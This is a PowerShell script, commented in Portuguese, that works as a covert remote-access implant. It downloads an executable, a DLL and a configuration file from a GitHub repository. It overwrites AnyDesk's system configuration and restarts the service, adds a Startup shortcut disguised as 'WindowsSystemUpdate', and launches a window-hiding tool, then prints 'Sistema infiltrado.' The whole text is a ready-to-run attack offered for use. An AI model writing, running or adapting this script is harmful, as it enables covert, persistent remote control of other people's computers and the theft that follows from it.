# 1. Definir caminhos
$myFolder = "$env:AppData\Questions"
$startupPath = "$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup"
$anydeskConfigDir = "C:\ProgramData\AnyDesk" # Pasta de sistema do AnyDesk

# 2. Criar a pasta local
if (!(Test-Path $myFolder)) { New-Item -ItemType Directory -Path $myFolder | Out-Null }

# 3. Baixar os ficheiros (RBTray, DLL e o teu system.conf)
$urls = @{
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBTray.exe" = "$myFolder\RBTray.exe"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/RBHook.dll" = "$myFolder\RBHook.dll"
    "https://github.com/Questions2013/Private/raw/refs/heads/main/system.conf" = "$myFolder\system.conf"
}

foreach ($url in $urls.Keys) {
    Invoke-WebRequest -Uri $url -OutFile $urls[$url]
}

# 4. Configurar o AnyDesk (Requer Admin para copiar para C:\ProgramData)
# Nota: Se fores Admin, isto funciona. Se fores utilizador, isto pode falhar.
if (Test-Path $anydeskConfigDir) {
    Stop-Service -Name "AnyDesk" -Force -ErrorAction SilentlyContinue
    Copy-Item -Path "$myFolder\system.conf" -Destination "$anydeskConfigDir\system.conf" -Force
    Start-Service -Name "AnyDesk" -ErrorAction SilentlyContinue
}

# 5. Criar o atalho no Startup (Invisível)
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("$startupPath\WindowsSystemUpdate.lnk")
$shortcut.TargetPath = "$myFolder\RBTray.exe"
$shortcut.WorkingDirectory = $myFolder
$shortcut.Description = "Windows System Management Tool"
$shortcut.Save()

# 6. Executar o RBTray
Start-Process "$myFolder\RBTray.exe"

Write-Host "Deploy completo, Questions! Sistema infiltrado." -ForegroundColor Green
